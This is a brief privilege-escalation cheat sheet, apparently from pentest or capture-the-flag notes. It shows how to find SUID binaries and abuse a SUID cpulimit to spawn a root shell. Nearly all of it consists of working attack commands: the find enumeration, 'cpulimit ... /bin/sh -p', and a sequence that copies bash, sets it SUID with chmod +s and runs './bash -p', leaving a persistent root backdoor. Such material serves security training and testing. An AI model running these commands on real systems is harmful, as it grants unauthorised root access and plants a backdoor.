Command:

`find / -type f -perm -u=s 2>/dev/null`

[GTFOBins](https://gtfobins.github.io/) is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

Here you want to see if there are any SUID based exploit for any found binary.

example:

```
$ find / -type f -perm -u=s 2>/dev/null
.......
/usr/bin/cpulimit
.......
```
https://gtfobins.github.io/gtfobins/cpulimit/#suid

```
sudo install -m =xs $(which cpulimit) .

./cpulimit -l 100 -f -- /bin/sh -p
```

If cpulimit is exploitable, you could install or exploit through existing binary.

To further extend this, you could also use this to copy change permission & then execute.


- Copy bash to your home
  - `cpulimit -l 100 -f cp /bin/bash .`

- Set UID/GID by chmod +s
  - `cpulimit -l 100 -f chmod +s ./bash`

- execute with -p (drop into shell)
  - `./bash -p`
